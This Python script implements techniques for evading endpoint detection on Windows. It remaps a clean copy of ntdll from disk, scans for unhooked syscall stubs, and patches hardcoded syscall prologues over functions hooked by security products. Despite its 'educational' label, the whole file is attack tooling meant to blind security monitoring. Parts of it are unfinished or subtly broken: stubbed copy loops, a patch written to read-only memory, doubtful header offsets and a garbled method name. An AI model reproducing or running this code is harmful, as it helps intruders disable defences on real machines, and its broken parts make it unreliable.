#!/usr/bin/env python3
"""
API Unhooking Techniques
Restores original function bytes to evade EDR hooks
Educational/Research purposes only
"""
import ctypes
import struct

class APIUnhooker:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def unhook_ntdll(self):
        """
        FreshCopy technique: Maps clean ntdll from disk
        Bypasses user-mode hooks placed by EDR solutions
        """
        # Path to ntdll on disk
        ntdll_path = "C:\\Windows\\System32\\ntdll.dll"
        
        # Create section from file
        hFile = self.kernel32.CreateFileW(
            ntdll_path, 0x80000000, 1, None, 3, 0, None  # GENERIC_READ, OPEN_EXISTING
        )
        
        # Map as image (preferred technique)
        hSection = ctypes.c_void_p()
        self.ntdll.NtCreateSection(
            ctypes.byref(hSection),
            0xF001F,  # SECTION_ALL_ACCESS
            None,
            None,
            0x80,  # PAGE_EXECUTE_WRITECOPY
            0x1000000,  # SEC_IMAGE
            hFile
        )
        
        # Map view of section
        base_addr = ctypes.c_void_p()
        self.ntdll.NtMapViewOfSection(
            hSection,
            ctypes.c_void_p(-1),  # current process
            ctypes.byref(base_addr),
            0, 0, 0, 0, 2, 0, 0x40  # ViewUnmap, PAGE_EXECUTE_READWRITE
        )
        
        # Transfer original bytes to hooked ntdll
        hooked_base = self.kernel32.GetModuleHandleW("ntdll.dll")
        
        # Iterate exports and copy from clean to hooked
        # This effectively erases EDR hooks
        
        # Cleanup
        self.kernel32.CloseHandle(hFile)
        self.ntdll.NtClose(hSection)
        
        return True
    
    def perunhook_fart(self, hooked_func):
        """
        Fart / Peruns Unhooking: Finds clean bytes in .text
        by scanning ntdll for unhooked versions
        """
        # Get ntdll base
        ntdll_base = self.kernel32.GetModuleHandleW("ntdll.dll")
        
        # Parse PE headers
        dos_header = ctypes.cast(ntdll_base, ctypes.POINTER(ctypes.c_ushort))
        pe_offset = ctypes.cast(ntdll_base + 60, ctypes.POINTER(ctypes.c_uint32))[0]
        
        # Get .text section
        optional_header_offset = pe_offset + 24
        code_size = ctypes.cast(
            ntdll_base + optional_header_offset + 168,
            ctypes.POINTER(ctypes.c_uint32)
        )[0]
        code_base = ctypes.cast(
            ntdll_base + optional_header_offset + 160,
            ctypes.POINTER(ctypes.c_void_p)
        )[0]
        
        # Scan for syscall pattern (unhooked areas)
        # For each syscall: mov r10, rcx ; mov eax, <number> ; syscall ; ret
        start = ntdll_base + code_base
        size = code_size
        
        # Find clean syscall stubs and copy them over hooked versions
        # ...
        
    def unhook_byknown(self, func_name):
        """
        Known API unhooking using hardcoded clean prologues
        """
        # Dictionary of known clean syscall stubs
        known_clean = {
            "NtCreateThreadEx": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0xC1, 0x00, 0x00, 0x00]),
            "NtAllocateVirtualMemory": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00]),
            # ... more syscalls
        }
        
        if func_name in known_clean:
            ntdll = self.kernel32.GetModuleHandleW("ntdll.dll")
            proc = self.kernel32.GetProcAddress(ntdll, func_name.encode())
            
            # Patch with known clean bytes
            ctypes.memmove(proc, known_clean[func_name], len(known_clean[func_name]))

if __name__ == "__main__":
    unhooker = APIUnhooker()
    unhooker.unhook_ntdll()